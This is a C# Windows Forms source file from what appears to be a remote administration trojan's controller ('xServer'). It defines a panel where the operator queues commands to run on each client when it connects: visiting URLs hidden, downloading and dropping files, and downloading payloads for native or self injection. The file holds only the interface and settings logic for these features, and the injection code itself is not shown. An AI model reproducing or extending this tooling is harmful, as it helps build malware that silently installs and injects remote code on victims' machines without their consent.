using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Input = xServer.Core.Misc.InputBox;
using JoinCmds = xServer.Core.Misc.OnJoinCommands;
using JoinCmd = xServer.Core.Misc.OnJoinCommand;
namespace xServer.Forms
{
    public partial class FrmOnJoin : Form
    {
        object _state = true;
        public FrmOnJoin()
        {
            InitializeComponent();
        }

        private void FrmOnJoin_Load(object sender, EventArgs e)
        {
            LoadExisting();
        }

        private void FrmOnJoin_FormClosing(object sender, FormClosingEventArgs e)
        {
            SaveCurrentList();
        }

        #region Misc
        private void RemoveFromList(ListViewItem lvi)
        {
            JoinCmd cmd = null;
            try
            {
                cmd = (JoinCmd)lvi.Tag;
            }
            catch (InvalidCastException) { }
            if (cmd == null)
                return;
            JoinCmds.MainList.Remove(cmd);
        }
        #endregion
        #region Loading
        private void LoadExisting()
        {
            if (JoinCmds.MainList.Count <= 0)
            {
                // load from settings
                JoinCmds.LoadFromSettings();
            }
            
            lstCommands.Items.Clear();

            lock (_state)
            {
                foreach (JoinCmd cmd in JoinCmds.MainList)
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Text = cmd.Type.ToString();
                    lvi.SubItems.Add(cmd.Value.ToString());
                    lvi.Tag = cmd;
                    lstCommands.Items.Add(lvi);
                }
            }
        }
        #endregion
        #region Saving
        private void SaveCurrentList()
        {
            JoinCmds.SaveToSettings();

        }
        #endregion
        #region Menu Options
        
        private void removeAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstCommands.Items)
            {
                RemoveFromList(lvi);
            }
            SaveCurrentList();
            LoadExisting();
        }
        private void removeItemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstCommands.SelectedItems)
            {
                RemoveFromList(lvi);
            }
            SaveCurrentList();
            LoadExisting();
        }
        private void hiddenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = "";
            if (Input.Show("On Join - Visit URL Hidden", "Please provide the URL to visit hidden", ref url) != System.Windows.Forms.DialogResult.OK)
                return;
            if (!url.StartsWith("http"))
            {
                MessageBox.Show("You didn't give a URL, remember, it starts with http!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            JoinCmds.MainList.Add(new Core.Misc.OnJoinCommand(Core.Misc.JoinCommand.VisitURLHidden, url));

            LoadExisting();
        }
        private void normalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = "";
            if (Input.Show("On Join - Visit URL", "Please provide the URL to visit in the default browser", ref url) != System.Windows.Forms.DialogResult.OK)
                return;
            if (!url.StartsWith("http"))
            {
                MessageBox.Show("You didn't give a URL, remember, it starts with http!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            JoinCmds.MainList.Add(new Core.Misc.OnJoinCommand(Core.Misc.JoinCommand.VisitURL, url));

            LoadExisting();
        }
        private void dropToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = "";
            if (Input.Show("On Join - DL and Drop", "Please provide the URL to download the file from", ref url) != System.Windows.Forms.DialogResult.OK)
                return;
            if (!url.StartsWith("http"))
            {
                MessageBox.Show("You didn't give a URL, remember, it starts with http!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            JoinCmds.MainList.Add(new Core.Misc.OnJoinCommand(Core.Misc.JoinCommand.DownloadDrop, url));
            SaveCurrentList();
            LoadExisting();
        }
        private void nativeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = "";
            if (Input.Show("On Join - DL and Native Inject", "Please provide the URL to download the file from", ref url) != System.Windows.Forms.DialogResult.OK)
                return;
            if (!url.StartsWith("http"))
            {
                MessageBox.Show("You didn't give a URL, remember, it starts with http!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            JoinCmds.MainList.Add(new Core.Misc.OnJoinCommand(Core.Misc.JoinCommand.DownloadNative, url));
            SaveCurrentList();
            LoadExisting();
        }
        private void selfInjectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = "";
            if (Input.Show("On Join - DL and Self Inject", "Please provide the URL to download the file from", ref url) != System.Windows.Forms.DialogResult.OK)
                return;
            if (!url.StartsWith("http"))
            {
                MessageBox.Show("You didn't give a URL, remember, it starts with http!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            JoinCmds.MainList.Add(new Core.Misc.OnJoinCommand(Core.Misc.JoinCommand.DownloadSelfInject, url));
            SaveCurrentList();
            LoadExisting();
        }
        #endregion

        
    }
}
